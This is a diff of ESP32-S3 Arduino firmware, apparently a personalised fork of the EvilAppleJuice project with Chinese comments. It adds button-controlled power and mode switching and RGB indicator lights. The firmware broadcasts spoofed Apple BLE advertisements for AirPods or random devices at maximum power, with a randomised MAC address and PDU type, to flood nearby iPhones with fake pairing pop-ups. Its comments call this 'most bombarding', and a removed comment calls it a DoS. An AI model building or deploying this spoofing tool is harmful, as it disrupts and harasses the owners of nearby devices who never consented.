@@ -1,6 +1,7 @@
-// This example takes heavy inpsiration from the ESP32 example by ronaldstoner
-// Based on the previous work of chipik / _hexway / ECTO-1A & SAY-10
-// See the README for more info
+// EvilAppleJuice ESP32-S3 个性化版本
+// 按键: 短按 BOOT = 切换模式(1=AirPods / 2=随机); 长按 BOOT(1s) = 电源开关
+// 灯光: 关闭=灭; AirPods模式=红光闪烁; 随机模式=随机变色闪烁
+// Based on ckcr4lyf/EvilAppleJuice-ESP32
 #include <Arduino.h>
 
 #include <BLEDevice.h>
@@ -11,7 +12,6 @@
 #include <esp_arduino_version.h>
 
 #include "devices.hpp"
-#include "led.hpp"
 #include "rgb.hpp"
 
 // Bluetooth maximum transmit power
@@ -26,41 +26,56 @@
 BLEAdvertising *pAdvertising;  // global variable
 uint32_t delayMilliseconds = 100;
 
-int currentMode = 0;
+// ---- 控制状态 ----
+bool deviceEnabled = true;  // 总开关（默认开）
+int currentMode = 1;        // 1 = AirPods(固定), 2 = Random(随机)
 Preferences preferences;
 
-#define RIGHT_LED 12
-#define LEFT_LED 13
-// ESP32-S3 开发板载 BOOT 按键接 GPIO0（按下为低电平）
-// 注意：复位/上电瞬间按住 GPIO0 会进入下载模式，正常运行时按则是切换模式
+// ESP32-S3 板载 BOOT 按键 = GPIO0（按下为低电平）
+// 注意: 复位/上电瞬间按住 GPIO0 会进入下载模式；运行中按键则控制本固件
 const int BOOT_BUTTON_PIN = 0;
-const unsigned long LONG_PRESS_TIME = 1000; // 1 seconds
+const unsigned long LONG_PRESS_TIME = 1000; // 长按阈值 1 秒
+
+void saveState() {
+  preferences.begin("my-app", false);
+  preferences.putBool("enabled", deviceEnabled);
+  preferences.putInt("mode", currentMode);
+  preferences.end();
+}
+
+void toggleEnabled() {
+  deviceEnabled = !deviceEnabled;
+  Serial.printf("Power %s\n", deviceEnabled ? "ON" : "OFF");
+  saveState();
+}
+
+void switchMode() {
+  currentMode = (currentMode == 1) ? 2 : 1;
+  Serial.printf("Mode: %d (%s)\n", currentMode, currentMode == 1 ? "AirPods" : "Random");
+  saveState();
+}
 
 void setup() {
   Serial.begin(115200);
   Serial.println("Starting ESP32 BLE");
 
-  // Open "storage" namespace (false = read/write)
+  // 读取上次状态: 开关 + 模式（默认 开 / AirPods）
   preferences.begin("my-app", false);
-
-  // Get the current mode, default to 0 if it doesn't exist
-  currentMode = preferences.getInt("mode", 0);
-  Serial.printf("Current Mode: %d\n", currentMode);
+  deviceEnabled = preferences.getBool("enabled", true);
+  currentMode = preferences.getInt("mode", 1);
+  if (currentMode < 1 || currentMode > 2) currentMode = 1;
   preferences.end();
+  Serial.printf("Power: %s, Mode: %d\n", deviceEnabled ? "ON" : "OFF", currentMode);
 
-  // 按键/指示灯引脚配置（原 AirM2M C3 板定义；在 S3 上 LED 无板载，BOOT 键=GPIO0）
-  pinMode(RIGHT_LED, OUTPUT);
-  pinMode(LEFT_LED, OUTPUT);
   pinMode(BOOT_BUTTON_PIN, INPUT_PULLUP);
 
-  // 板载 RGB (WS2812 @ GPIO48) 模式指示灯
+  // 板载 RGB (WS2812 @ GPIO48)
   initRgb();
-  Serial.println("RGB LED ready");
-  
+  rgbOff();
+
   BLEDevice::init("AirPods 69");
 
   // Increase the BLE Power to 21dBm (MAX)
-  // https://docs.espressif.com/projects/esp-idf/en/stable/esp32c3/api-reference/bluetooth/controller_vhci.html
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
 
   // Create the BLE Server
@@ -70,22 +85,6 @@ void setup() {
   // seems we need to init it with an address in setup() step.
   esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
   pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
-}
-
-void resetMode(){
-  currentMode = 0;
-  Serial.printf("Resetting mode to %d\n", currentMode);
-  preferences.begin("my-app", false);
-  preferences.putInt("mode", currentMode);
-  preferences.end();
-}
-
-void nextMode(){
-  currentMode = (currentMode + 1) % (sizeof(stateTable) / sizeof(stateTable[0]));
-  Serial.printf("Updating mode to %d\n", currentMode);
-  preferences.begin("my-app", false);
-  preferences.putInt("mode", currentMode);
-  preferences.end();
 }
 
 void setAdvertisementData(BLEAdvertisementData &oAdvertisementData, const AppleDevice& dev) {
@@ -110,43 +109,66 @@ void setRandomDeviceData(BLEAdvertisementData &oAdvertisementData) {
   setAdvertisementData(oAdvertisementData, dev);
 }
 
-bool shouldBeLitOn(LEDMode mode) {
-  switch (mode) {
-    case ON:    return true;
-    case OFF:   return false;
-    case FLASH: return true;
-    default:    return false;
+// ---- 灯光: 按开关+模式刷新 RGB ----
+void updateLed() {
+  if (!deviceEnabled) {
+    rgbOff();
+    return;
+  }
+  if (currentMode == 1) {
+    // AirPods 模式: 红光闪烁 (600ms 周期)
+    if ((millis() % 600) < 300) setRgb(255, 0, 0);
+    else rgbOff();
+  } else {
+    // 随机模式: 随机变色闪烁 (亮 250ms / 灭 250ms, 每次亮起换随机色)
+    static unsigned long nextHueChange = 0;
+    static uint16_t hue = 0;
+    if (millis() >= nextHueChange) {
+      hue = random(360);
+      nextHueChange = millis() + 500;
+    }
+    if ((millis() % 500) < 250) setRgbHsv(hue);
+    else rgbOff();
   }
 }
 
-bool shouldBeLitOff(LEDMode mode) {
-  switch (mode) {
-    case ON:    return false;
-    case OFF:   return true;
-    case FLASH: return true;
-    default:    return false;
+// ---- 按键: 非阻塞状态机 (短按切模式 / 长按1s开关) ----
+void handleButton() {
+  static unsigned long pressStart = 0;
+  static bool pressActive = false;
+  static bool longHandled = false;
+
+  bool pressed = (digitalRead(BOOT_BUTTON_PIN) == LOW);
+  unsigned long now = millis();
+
+  if (pressed && !pressActive) {
+    pressActive = true;
+    pressStart = now;
+    longHandled = false;
+  } else if (pressed && pressActive) {
+    if (!longHandled && (now - pressStart) >= LONG_PRESS_TIME) {
+      Serial.println("BOOT long press -> toggle power");
+      toggleEnabled();
+      longHandled = true;  // 长按已触发，松开时不再判为短按
+    }
+  } else if (!pressed && pressActive) {
+    if (!longHandled) {
+      Serial.println("BOOT short press -> switch mode");
+      switchMode();
+    }
+    pressActive = false;
   }
 }
 
 void loop() {
-  digitalWrite(LEFT_LED,  shouldBeLitOn(stateTable[currentMode][0])  ? HIGH : LOW);
-  digitalWrite(RIGHT_LED, shouldBeLitOn(stateTable[currentMode][1]) ? HIGH : LOW);
+  handleButton();
 
-  // 刷新板载 RGB 模式指示灯
-  updateRgb(currentMode);
-
-  if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
-    unsigned long startTime = millis();
-    while(digitalRead(BOOT_BUTTON_PIN) == LOW); 
-
-    unsigned long pressDuration = millis() - startTime;
-    if (pressDuration > LONG_PRESS_TIME) {
-      Serial.println("BOOT button long pressed!");
-      resetMode();
-    } else {
-      Serial.println("BOOT button short pressed!");
-      nextMode();
-    }
+  // 电源关闭: 停止广播、灯灭
+  if (!deviceEnabled) {
+    pAdvertising->stop();
+    rgbOff();
+    delay(delayMilliseconds);
+    return;
   }
 
   // First generate fake random MAC
@@ -164,37 +186,11 @@ void loop() {
 
   BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
 
-  switch (currentMode){
-    case LEFT_OFF_RIGHT_OFF:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS]); // 模式0：固定 AirPods（最轰炸）
-      break;
-    case LEFT_OFF_RIGHT_FLASH:
+  // 模式 1: 固定 AirPods（最轰炸）；模式 2: 随机设备
+  if (currentMode == 1) {
+    setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS]);
+  } else {
     setRandomDeviceData(oAdvertisementData);
-      break;
-    case LEFT_OFF_RIGHT_ON:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[SOFTWARE_UPDATE]); // This is fairly spammy, not all phones
-      break;
-    case LEFT_FLASH_RIGHT_OFF:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS_GEN_2]); // TBD
-      break;
-    case LEFT_FLASH_RIGHT_FLASH:
-    setAdvertisementData(oAdvertisementData, ALL_DEVICES[VISION_PRO]); // THis one affects very few devices, not as spammy (but kinda fun)
-      break;
-    case LEFT_FLASH_RIGHT_ON:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS_MAX]); // TBD
-      break;
-    case LEFT_ON_RIGHT_OFF:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[APPLETV_SETUP]); // TBD
-      break;
-    case LEFT_ON_RIGHT_FLASH:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[TRANSFER_NUMBER]); // TBD
-      break;
-    case LEFT_ON_RIGHT_ON:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[APPLETV_PAIR]); // TBD
-      break;
-    default:
-      setAdvertisementData(oAdvertisementData, ALL_DEVICES[HOMEPOD_SETUP]); // TBD
-      break;
   }
 
   /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
@@ -204,12 +200,7 @@ void loop() {
           // 2 = ADV_TYPE_NONCONN_IND
       
       Randomly using any of these PDU types may increase detectability of spoofed packets. 
-
-      What we know for sure:
-      - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
-                        Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
   */
-  
   int adv_type_choice = random(3);
   if (adv_type_choice == 0){
     pAdvertising->setAdvertisementType(ADV_TYPE_IND);
@@ -223,25 +214,13 @@ void loop() {
   pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
   pAdvertising->setAdvertisementData(oAdvertisementData);
   
-  // Set advertising interval
-  /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
-      an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
-      
-      These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
-  */
-
-  //pAdvertising->setMinInterval(0x20);
-  //pAdvertising->setMaxInterval(0x20);
-  //pAdvertising->setMinPreferred(0x20);
-  //pAdvertising->setMaxPreferred(0x20);
-
   // Start advertising
   pAdvertising->start();
-
-  digitalWrite(LEFT_LED,  shouldBeLitOff(stateTable[currentMode][0]) ? LOW : HIGH);
-  digitalWrite(RIGHT_LED, shouldBeLitOff(stateTable[currentMode][1]) ? LOW : HIGH);
   delay(delayMilliseconds); // delay for delayMilliseconds ms
   pAdvertising->stop();
+
+  // 刷新模式灯光
+  updateLed();
 
   // Random signal strength increases the difficulty of tracking the signal
   int rand_val = random(100);  // Generate a random number between 0 and 99
